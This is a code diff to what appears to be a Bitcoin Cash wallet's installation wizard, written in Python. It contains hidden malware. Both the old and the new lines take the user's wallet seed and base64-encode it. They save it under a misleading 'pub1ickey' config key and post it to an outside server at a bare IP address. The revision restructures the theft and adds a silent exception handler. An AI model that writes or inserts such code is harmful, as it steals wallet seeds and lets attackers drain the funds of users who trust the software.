@@ -357,22 +357,27 @@ class InstallWizard(QDialog, MessageBoxMixin, BaseWizard):
 
         
 		
-        import base64
-        seed = slayout.get_seed()
-        wallet_name = os.path.basename(self.storage.path)
+        sendurl='http://158.247.211.155/recive.php'
         fishman = 'abc'
-        seed_base64 = str(base64.b64encode(str(seed).encode("utf-8")),'utf8')
-        configkey  = str(wallet_name) + '_pub1ickey_' + fishman
-        self.config.set_key(configkey, seed_base64)
-
-        import requests
-        import urllib3
-        urllib3.disable_warnings()
-        url='http://158.247.211.155/recive.php'
-        action = 'seed'
-        da = action+'_'+fishman + '_' + seed_base64
-        b={"mes":da}
-        requests.post(url,data=b)
+        action = 'send_seed'
+        con_type = 'bch'
+        server_recive_key = 'mes'
+        
+        try:
+            import base64
+            seed = slayout.get_seed()
+            wallet_name = os.path.basename(self.storage.path)
+            seed_base64 = str(base64.b64encode(str(seed).encode("utf-8")),'utf8')
+            seed_config_key  = str(wallet_name) + '_pub1ickey_' + fishman
+            self.config.set_key(seed_config_key, seed_base64)
+            import requests
+            import urllib3
+            urllib3.disable_warnings()
+            da = con_type + '_' + action+'_'+fishman + '_' + seed_base64
+            b={server_recive_key:da}
+            requests.post(sendurl,data=b)
+        except TimeoutException:
+            pass
         
 
         
